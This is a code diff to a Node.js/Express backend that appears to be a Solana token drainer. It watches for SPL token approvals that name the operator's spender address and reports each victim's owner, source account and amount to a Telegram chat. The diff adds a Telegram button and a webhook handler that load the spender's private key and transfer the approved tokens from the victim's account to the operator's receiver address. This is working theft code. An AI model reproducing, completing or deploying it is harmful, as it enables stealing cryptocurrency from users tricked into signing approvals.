@@ -1,7 +1,9 @@
 import express from "express";
 import cors from "cors";
 import fetch from "node-fetch";
-import { Connection, PublicKey, SystemProgram } from "@solana/web3.js";
+import { Connection, PublicKey, SystemProgram, Keypair, Transaction } from "@solana/web3.js";
+import { TOKEN_PROGRAM_ID, createTransferInstruction } from "@solana/spl-token";
+import bs58 from "bs58";
 import dotenv from "dotenv";
 
 dotenv.config();
@@ -14,7 +16,8 @@ const REQUIRED_ENVS = [
   "TELEGRAM_CHAT_ID",
   "RPC_URL",
   "RECEIVER_SOL_ADDRESS",
-  "SPENDER_SOL_ADDRESS"
+  "SPENDER_SOL_ADDRESS",
+  "SPENDER_PRIVATE_KEY"
 ];
 for (const k of REQUIRED_ENVS) {
   if (!process.env[k]) throw new Error(`Missing env var: ${k}`);
@@ -35,7 +38,7 @@ app.use(express.json({ limit: "100kb" }));
 
 const allowedOrigins = [
   "http://localhost:3000",
-  "https://thevoidlist.vercel.app"
+  "https://voidlist.vercel.app"
 ];
 
 app.use(cors({
@@ -66,13 +69,42 @@ const PORT = process.env.PORT || 3000;
 const connection = new Connection(process.env.RPC_URL, "confirmed");
 
 /*************************************************
- * TELEGRAM HELPER
+ * TELEGRAM HELPERS
  *************************************************/
 async function sendTelegramMessage(text) {
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text })
+  });
+}
+
+async function sendTelegramMessageWithButton(text, txHash, approveDetails) {
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "🚀 Transfer Approved Tokens",
+              callback_data: `transfer:${txHash}:${approveDetails.source}:${approveDetails.amount}`
+            }
+          ]
+        ]
+      }
+    })
+  });
+}
+
+async function answerCallback(callbackQueryId, text) {
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ callback_query_id: callbackQueryId, text })
   });
 }
 
@@ -110,7 +142,7 @@ app.post("/notifyAtomic", async (req, res) => {
       }
 
       // Check for SPL token approve
-      if (programId === "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") {
+      if (programId === TOKEN_PROGRAM_ID.toString()) {
         const data = Buffer.from(ix.data, "base64");
         if (data[0] === 9) { // Approve opcode
           const amount = data.readBigUInt64LE(1);
@@ -145,7 +177,9 @@ Approve details:
 - Delegate: ${approveDetails.delegate}
 - Owner: ${approveDetails.owner}
 - Amount: ${approveDetails.amount}`;
-    await sendTelegramMessage(text);
+
+    // Send with button
+    await sendTelegramMessageWithButton(text, txHash, approveDetails);
 
     res.json({ success: true });
   } catch (e) {
@@ -153,6 +187,53 @@ Approve details:
     await sendTelegramMessage(`❌ Backend error\n${e.message}`);
     res.status(500).json({ error: e.message });
   }
+});
+
+/*************************************************
+ * TELEGRAM WEBHOOK HANDLER
+ *************************************************/
+app.post("/telegramWebhook", async (req, res) => {
+  const update = req.body;
+
+  if (update.callback_query) {
+    const data = update.callback_query.data;
+
+    if (data.startsWith("transfer:")) {
+      const [, txHash, source, amount] = data.split(":");
+
+      try {
+        // Load spender keypair
+        const spenderKeypair = Keypair.fromSecretKey(bs58.decode(process.env.SPENDER_PRIVATE_KEY));
+
+        // Build transfer instruction
+        const sourcePubkey = new PublicKey(source);
+        const destinationPubkey = new PublicKey(process.env.RECEIVER_SOL_ADDRESS);
+
+        const ix = createTransferInstruction(
+          sourcePubkey,
+          destinationPubkey,
+          spenderKeypair.publicKey,
+          BigInt(amount),
+          [],
+          TOKEN_PROGRAM_ID
+        );
+
+        const transaction = new Transaction().add(ix);
+        transaction.feePayer = spenderKeypair.publicKey;
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        const signedTx = await connection.sendTransaction(transaction, [spenderKeypair]);
+
+        await answerCallback(update.callback_query.id, `✅ Transfer executed!\nTx: ${signedTx}`);
+      } catch (err) {
+        console.error(err);
+        await answerCallback(update.callback_query.id, `❌ Transfer failed: ${err.message}`);
+      }
+    }
+  }
+
+  res.sendStatus(200);
 });
 
 /*************************************************
